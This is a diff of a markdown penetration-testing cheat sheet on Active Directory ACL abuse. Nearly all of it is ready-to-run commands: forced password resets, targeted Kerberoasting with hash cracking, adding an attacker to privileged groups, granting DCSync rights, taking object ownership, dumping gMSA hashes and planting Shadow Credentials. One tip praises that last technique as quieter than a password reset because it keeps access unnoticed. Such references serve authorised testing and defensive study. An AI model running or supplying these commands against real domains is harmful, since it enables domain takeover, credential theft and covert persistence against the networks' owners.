@@ -1,82 +1,182 @@
 # ACL Abuse
 
 !!! tip "Tip"
-    BloodHound highlights ACL abuse paths (WriteDACL, GenericAll, GenericWrite, ForceChangePassword). Use `PowerView` to enumerate and exploit: `Add-DomainObjectAcl`, `Set-DomainUserPassword`, etc.
+    BloodHound is the authoritative source for ACL paths — it resolves nested group memberships and converts control rights (WriteDACL, GenericAll, GenericWrite, AddMember, ForceChangePassword, WriteOwner, AllExtendedRights) into actionable attack edges. Don't manually enumerate ACLs domain-wide; target specific objects after BloodHound points you at them.
 
 ---
 
-## Identifying Vulnerable ACLs
-
-### Enumerate ACLs with PowerView
+## Enumerate ACLs (PowerView dev branch)
 
 ```powershell
-Get-ObjectAcl -DistinguishedName "CN=Domain Admins,CN=Users,DC=corp,DC=com" -ResolveGUIDs | Format-Table SecurityIdentifier,ActiveDirectoryRights
-```
+Import-Module .\PowerView.ps1
 
-### Convert SIDs to Usernames
+# All ACLs on a target
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | FT SecurityIdentifier,ActiveDirectoryRights,ObjectAceType
 
-```powershell
-Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
-```
+# Only interesting rights
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|AllExtendedRights' }
 
----
+# SID → name
+ConvertFrom-SID S-1-5-21-1987370270-658905905-1781884369-1104
 
-## Exploiting `GenericAll`
-
-If a low-privileged user has `GenericAll` on a privileged account, they can reset the password.
-
-```powershell
-Set-DomainUserPassword -Identity admin -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
-```
-
-```powershell
-net use \\dc01 /user:corp\admin NewPass123!
+# What does <user> have rights over?
+Get-DomainObjectAcl -ResolveGUIDs -Identity * | ? { $_.SecurityIdentifier -eq (ConvertTo-SID <user>) }
 ```
 
 ---
 
-## Exploiting `WriteDACL`
+## GenericAll / GenericWrite on a User
 
-Grant `GenericAll` to a controlled account:
+### Force a password reset
 
 ```powershell
-Add-ObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "user1" -Rights GenericAll
+$SecPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity target_user -AccountPassword $SecPass
 ```
 
-Add that account to Domain Admins:
+From Linux:
+
+```bash
+net rpc password target_user 'NewPass123!' -U 'example.com/<attacker>%<pass>' -S 10.10.10.10
+```
+
+### Targeted Kerberoasting (GenericWrite only)
+
+If you can't reset the password, set an SPN on the account, request its TGS, crack it:
 
 ```powershell
-Add-DomainGroupMember -Identity "Domain Admins" -Members user1
+Set-DomainObject -Identity target_user -Set @{serviceprincipalname='fake/spn'}
+```
+
+```bash
+impacket-GetUserSPNs example.com/<attacker>:<pass> -dc-ip 10.10.10.10 -request -outputfile tgs.hash
+hashcat -m 13100 tgs.hash rockyou.txt
+```
+
+Then clear the SPN to clean up:
+
+```powershell
+Set-DomainObject -Identity target_user -Clear serviceprincipalname
 ```
 
 ---
 
-## Exploiting `WriteOwner`
+## GenericAll on a Group
 
-Take ownership of a privileged account:
+Add yourself as a member:
 
 ```powershell
-Set-DomainObjectOwner -Identity "admin" -OwnerIdentity "user1"
+Add-DomainGroupMember -Identity "Target Group" -Members <attacker>
 ```
 
-Then grant full control:
+From Linux:
 
-```powershell
-Add-ObjectAcl -TargetIdentity "admin" -PrincipalIdentity "user1" -Rights GenericAll
+```bash
+net rpc group addmem "Target Group" <attacker> -U 'example.com/<user>%<pass>' -S 10.10.10.10
 ```
 
 ---
 
-## DCSync via `Replicating Directory Changes`
+## WriteDACL on the Domain — Grant DCSync
 
-### Check for DCSync Privileges
+With `WriteDACL` on the root domain object, grant yourself replication rights:
 
 ```powershell
-Get-ObjectAcl -DistinguishedName "DC=corp,DC=com" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match "Replicating")}
+Add-DomainObjectAcl -TargetIdentity "DC=example,DC=com" -PrincipalIdentity <attacker> -Rights DCSync
 ```
 
-### Extract Hashes
+Then run DCSync — see [DCSync](dcsync.md).
+
+From Linux (`dacledit.py` from Impacket, recent versions):
+
+```bash
+dacledit.py -action write -rights DCSync -principal <attacker> -target-dn 'DC=example,DC=com' example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+```
+
+---
+
+## WriteOwner on an Object
+
+Take ownership first, then grant yourself full control:
 
 ```powershell
-mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
+Set-DomainObjectOwner -Identity target_user -OwnerIdentity <attacker>
+Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity <attacker> -Rights All
+```
+
+From Linux:
+
+```bash
+owneredit.py -action write -new-owner <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+dacledit.py -action write -rights FullControl -principal <attacker> -target target_user example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+```
+
+---
+
+## ForceChangePassword Extended Right
+
+A targeted form of password reset — doesn't require knowing the old password.
+
+```powershell
+Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+```
+
+---
+
+## ReadGMSAPassword — Retrieve gMSA Password
+
+Group Managed Service Accounts (gMSA) store their password in a special LDAP attribute. If your user or a group you're in has read access, retrieve and use the NTLM hash:
+
+```bash
+nxc ldap 10.10.10.10 -u <user> -p '<pass>' --gmsa
+
+# Or with gMSADumper
+gMSADumper.py -u <user> -p '<pass>' -d example.com
+```
+
+The returned NTLM hash can be used directly for pass-the-hash against services the gMSA controls.
+
+---
+
+## Shadow Credentials (msDS-KeyCredentialLink)
+
+Modern alternative to password reset — works when you have GenericWrite/GenericAll on a user or computer and the domain has Kerberos PKI enabled (any DC running Windows Server 2016+ that supports [PKINIT](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)). You add a certificate to `msDS-KeyCredentialLink`, then use it to request a TGT.
+
+### With pywhisker (Linux)
+
+```bash
+pywhisker.py -d example.com -u <attacker> -p '<pass>' --target target_user --action add
+```
+
+This drops a `.pfx` file. Use it with PKINITtools:
+
+```bash
+gettgtpkinit.py -cert-pfx target_user.pfx -pfx-pass '<pfx-password>' example.com/target_user target_user.ccache
+export KRB5CCNAME=target_user.ccache
+```
+
+Then use the TGT to get the NT hash via U2U:
+
+```bash
+getnthash.py -key <as-rep-key> example.com/target_user
+```
+
+### With Whisker (Windows)
+
+```powershell
+.\Whisker.exe add /target:target_user
+# Follow Rubeus asktgt command emitted by Whisker
+```
+
+!!! tip "When to use Shadow Credentials over password reset"
+    Resetting a user's password locks them out and gets noticed immediately. Shadow Credentials add a cert without changing the password — the user keeps working, you keep access. Much quieter for real engagements.
+
+---
+
+## AddSelf — Add Yourself to a Group
+
+If you have `Self` + `Member` write rights on a group, add yourself without needing `GenericAll`:
+
+```powershell
+Add-DomainGroupMember -Identity "Target Group" -Members <attacker>
 ```
